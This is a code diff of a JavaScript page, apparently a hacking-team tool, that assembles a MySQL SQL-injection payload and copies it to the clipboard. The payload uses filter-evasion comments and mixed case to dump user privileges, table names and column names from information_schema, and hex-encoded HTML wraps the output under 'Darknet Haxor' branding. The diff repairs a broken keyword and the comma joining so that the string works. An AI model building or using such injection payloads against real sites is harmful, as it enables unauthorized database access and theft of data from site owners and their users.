@@ -22,7 +22,7 @@ const data = [
   { type: "pair", hex: "0x3c62723e", string: "<br>" },
   { type: "comment", value: "))))w)" },
   { type: "pair", hex: "0x3c2f74683e3c2f74723e3c74723e3c746820636f6c7370616e3d2232223e3c64697620616c69676e3d2263656e746572223e3c666f6e7420636f6c6f723d7265643e3c6e3e557365722050726976696c6567653c2f6e3e3c2f74683e3c2f74723e3c74723e3c746820636f6c7370616e3d2232223e", string: "</th></tr><tr><th colspan=\"2\"><div align=\"center\"><font color=red><n>User Privilege</n></th></tr><tr><th colspan=\"2\">" },
-  { type: "comment", value: "(SeLECT(@z)/*!50000FrOM/**Darknet-Haxor**/*/(/*!50000SeLECT/**xnxx**/*/(@z:=0x00) ,(SeLECT(@z)/*!50000FrOM/**Darknet-Haxor**/*/(/*!50000INFOrmATiON_SChEmA/**Darknet-Haxor**/*/.UsER_PRIViLEgES)/*!50000WhErE/**Darknet-Haxor**/*/(@z)IN(@z:=/*!50000CoNCaT/**Darknet-Haxor**/*/(0x20,@z" },
+  { type: "comment", value: "(SeLECT(@z)/*!50000FrOM/**Darknet-Haxor**/*/(/*!50000SeLECT/**xnxx**/*/(@z:=0x00) ,(SeLECT(@z)/*!50000FrOM/**Darknet-Haxor**/*/(/*!50000INFOrmATiON_SChEmA/**Darknet-Haxor**/*/.UsER_PRIViLEgES)/*!50000WhERE/**Darknet-Haxor**/*/(@z)IN(@z:=/*!50000CoNCaT/**Darknet-Haxor**/*/(0x20,@z" },
   { type: "pair", hex: "", string: "GrANtEE" },
   { type: "pair", hex: "0x202d3e20", string: " -> " },
   { type: "pair", hex: "", string: "Is_gRANTaBLE" },
@@ -30,7 +30,7 @@ const data = [
   { type: "comment", value: "))))z)" },
   { type: "pair", hex: "0x3c2f74683e3c2f74723e", string: "</th></tr>" },
   { type: "pair", hex: "0x3c2f74683e3c2f74723e3c74723e3c746820636f6c7370616e3d2232223e3c64697620616c69676e3d2263656e746572223e3c696d6720647261676761626c653d2266616c736522207372633d2268747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f4b696d65747375416e647265612f50726f66696c652f726566732f68656164732f6d61696e2f62616e6e65722e676966222077696474683d343630206865696768743d363020616c743d2244616b726e6574204861786f72205465616d223e3c2f74683e3c2f74723e3c74723e3c74683e3c64697620616c69676e3d2263656e746572223e3c666f6e7420636f6c6f723d7265643e5461626c65204e616d653c2f74683e3c74683e3c64697620616c69676e3d2263656e746572223e3c666f6e7420636f6c6f723d7265643e436f6c756d6e204e616d653c2f74683e3c2f74686561643e3c2f74723e3c74626f64793e", string: "</th></tr><tr><th colspan=\"2\"><div align=\"center\"><img draggable=\"false\" src=\"https://raw.githubusercontent.com/KimetsuAndrea/Profile/refs/heads/main/banner.gif\" width=460 height=60 alt=\"Dakrnet Haxor Team\"></th></tr><tr><th><div align=\"center\"><font color=red>Table Name</th><th><div align=\"center\"><font color=red>Column Name</th></thead></tr><tbody>" },
-  { type: "comment", value: "(selEct(@x)/*!50000fRom/**Darknet-Haxor**/*/(/*!50000sElect/**Darknet-Haxor**/*/(@x:=0x00),( fract(0)/*!From/**Darknet-Haxor**/*/(/*!50000inforMation_schEma.coLuMns/**Darknet-Haxor**/*/)/*!50000Where/**Darknet-Haxor**/*/(taBle_schema=/*!50000DatAbase/**Darknet-Haxor**/*/())and(0x00)in(@x:=/*!50000coNcat/**Darknet-Haxor**/*/(@x" },
+  { type: "comment", value: "(selEct(@x)/*!50000fRom/**Darknet-Haxor**/*/(/*!50000sElect/**Darknet-Haxor**/*/(@x:=0x00),(sElect(0)/*!From/**Darknet-Haxor**/*/(/*!50000inforMation_schEma.coLuMns/**Darknet-Haxor**/*/)/*!50000Where/**Darknet-Haxor**/*/(taBle_schema=/*!50000DatAbase/**Darknet-Haxor**/*/())and(0x00)in(@x:=/*!50000coNcat/**Darknet-Haxor**/*/(@x" },
   { type: "pair", hex: "0x3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d7265642073697a653d333e", string: "</font></td><td><font color=red size=3>" },
   { type: "pair", hex: "0x3c64697620616c69676e3d226c656674223e", string: "<div align=\"left\">" },
   { type: "comment", value: "/*!50000tAble_naMe/**Darknet-Haxor**/*/" },
@@ -86,21 +86,24 @@ function displayData() {
 // Function to copy all hex codes and comments to clipboard
 function copyAllContent() {
   let pairIndex = 0;
-  const content = data
-    .map((item) => {
-      if (item.type === 'pair') {
-        const textarea = document.getElementById(`string-${pairIndex}`);
-        pairIndex++;
-        return textarea ? stringToHex(textarea.value) : item.hex;
-      } else {
-        return item.value;
-      }
-    })
-    .join(',');
+  const contentParts = data.map((item) => {
+    if (item.type === 'pair') {
+      const textarea = document.getElementById(`string-${pairIndex}`);
+      pairIndex++;
+      return textarea ? stringToHex(textarea.value) : item.hex;
+    } else {
+      return item.value;
+    }
+  });
   
-  const wrappedContent = `${content}`;
+  // Handle comma placement: no leading comma after first comment, no trailing comma before last comment
+  let content = contentParts[0]; // Start with first comment (includes opening parenthesis)
+  for (let i = 1; i < contentParts.length - 1; i++) {
+    content += ',' + contentParts[i];
+  }
+  content += contentParts[contentParts.length - 1]; // Append last comment without comma
   
-  navigator.clipboard.writeText(wrappedContent).then(() => {
+  navigator.clipboard.writeText(content).then(() => {
     showToast();
   }).catch(err => {
     console.error('Failed to copy: ', err);
